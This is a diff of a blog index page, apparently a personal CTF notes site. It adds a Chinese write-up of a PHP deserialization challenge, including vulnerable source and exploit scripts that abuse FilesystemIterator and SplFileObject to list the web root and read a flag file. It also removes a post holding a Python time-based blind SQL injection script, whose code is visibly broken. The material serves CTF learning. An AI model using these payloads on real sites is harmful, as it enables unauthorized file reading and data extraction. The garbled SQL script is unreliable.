@@ -169,6 +169,79 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-php反序列化之原生类" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB/">
+        php反序列化之原生类
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php反序列化之原生类"><a href="#php反序列化之原生类" class="headerlink" title="php反序列化之原生类"></a>php反序列化之原生类</h1><p>SLP类存在可以进行文件处理和迭代的类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Directorylterator                                遍历目录</span><br><span class="line"></span><br><span class="line">Filesystemlterator                              遍历目录</span><br><span class="line"></span><br><span class="line">Globlterator                                      遍历目录，但是不同点在于它可以通配，例如var/html/www/flag*</span><br><span class="line"></span><br><span class="line">SplFileObject                                     读取文件，按行读取，多行需要遍历</span><br><span class="line"></span><br><span class="line">finfo/finfo_open()                               需要两个参数</span><br><span class="line"></span><br><span class="line">reflectionMethod($class,$function)     返回类和方法</span><br><span class="line"></span><br><span class="line">getDocComment()                              返回reflectionMethod的值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>例如：安恒月赛DASCTF三月娱乐赛（ez_serialize)</p>
+<p>审计源代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">	</span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">class A&#123; </span><br><span class="line">		public $class; </span><br><span class="line">		public $para; </span><br><span class="line">		public $check; </span><br><span class="line">	public function __construct() &#123;</span><br><span class="line"> 					$this-&gt;class = &quot;B&quot;; </span><br><span class="line">					$this-&gt;para = &quot;ctfer&quot;;</span><br><span class="line">					 echo new $this-&gt;class ($this-&gt;para);</span><br><span class="line"> &#125;</span><br><span class="line"> 	public function __wakeup() &#123; </span><br><span class="line">		$this-&gt;check = new C;</span><br><span class="line">		 if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123; </span><br><span class="line">						</span><br><span class="line"></span><br><span class="line">			echo new $this-&gt;class ($this-&gt;para); </span><br><span class="line">&#125; </span><br><span class="line">		else die(&#x27;bad hacker~&#x27;);</span><br><span class="line"> &#125; </span><br><span class="line">&#125; </span><br><span class="line">class B&#123;</span><br><span class="line"> 	var $a;</span><br><span class="line"> 	public function __construct($a) &#123; </span><br><span class="line">		$this-&gt;a = $a;</span><br><span class="line">		 echo (&quot;hello &quot;.$this-&gt;a); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">class C&#123; </span><br><span class="line">	function vaild($code)&#123; </span><br><span class="line">		$pattern = &#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;;</span><br><span class="line">		 if (preg_match($pattern, $code))&#123; </span><br><span class="line">			return false; </span><br><span class="line">&#125; </span><br><span class="line">			else return true; </span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line">	if(isset($_GET[&#x27;pop&#x27;]))&#123; </span><br><span class="line">		unserialize($_GET[&#x27;pop&#x27;]); </span><br><span class="line">&#125; </span><br><span class="line">	else&#123; </span><br><span class="line">		$a=new A; </span><br><span class="line">&#125; hello ctfer</span><br></pre></td></tr></table></figure>
+
+<p>可以构造exp’</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">		public $class=&#x27;Filesystemlterator&#x27;; </span><br><span class="line">		public $para=&quot;var/www/html&quot;; </span><br><span class="line">		public $check;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=new A();</span><br><span class="line"></span><br><span class="line">echo serialize($b);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>得到序列化的数值后，构造payload</p>
+<p>得到aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE文件名</p>
+<p>然后在构造exp读取里面的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">		public $class=&#x27;SplFileObject &#x27;; </span><br><span class="line">		public $para=&quot;var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; </span><br><span class="line">		public $check;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=new A();</span><br><span class="line"></span><br><span class="line">echo serialize($b);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后看页面源代码，看见flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-nuctf[just serialize]内置类和php引用" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -987,67 +1060,9 @@ echo strcmp($_GET['ret'],'wer');
 
 
   
-    <article id="post-sql延时注入" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/sql%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/">
-        sql延时注入
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url=&quot; &quot;</span><br><span class="line"></span><br><span class="line">def timeOut(url): #定义一个timeOut的函数</span><br><span class="line"></span><br><span class="line">	try:</span><br><span class="line">                      </span><br><span class="line">                    res=request.get(url,timeout=3)</span><br><span class="line">		rest.text</span><br><span class="line">	  except Exception as e:</span><br><span class="line">		return &quot;timeout&quot;</span><br><span class="line"></span><br><span class="line">dbNameLen=0</span><br><span class="line">while true:</span><br><span class="line">	dbNameLen+=1</span><br><span class="line">	dbNameLen_url=url+&quot;?id=1&#x27;+and+if(length(database())=&quot;+str(dbNameLen)+&quot;,sleep(5),1)--+&quot;</span><br><span class="line"></span><br><span class="line">	if &quot;timeout&quot; in timeOut(dbNameLen_url):</span><br><span class="line">	print(&quot;The len of dbNmae:&quot;+str(dbNameLen))</span><br><span class="line">	break</span><br><span class="line"></span><br><span class="line">	if dbNameLen==30:</span><br><span class="line">	print(&quot;error&quot;)</span><br><span class="line">	break</span><br><span class="line">	</span><br><span class="line">dbName=&quot; &quot;</span><br><span class="line">for i in range(1,dbNameLen+1):</span><br><span class="line">	for char in string.acsii_lowercase:</span><br><span class="line">		dbName_url=url+&quot;?id=1&#x27;+and+if(substr(database(),&quot;+str(i)+&quot;,1)=&#x27;&quot;+char+&quot;&#x27;,sleep(5),1)--+&quot;  </span><br><span class="line">	if  &quot;timeout&quot; in timeOut(dbName_url):</span><br><span class="line">		dbName+=char</span><br><span class="line">		print(&quot;The dbName:&quot;+dbName)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" rel="tag">脚本编写</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
     </nav>
   
 </div>
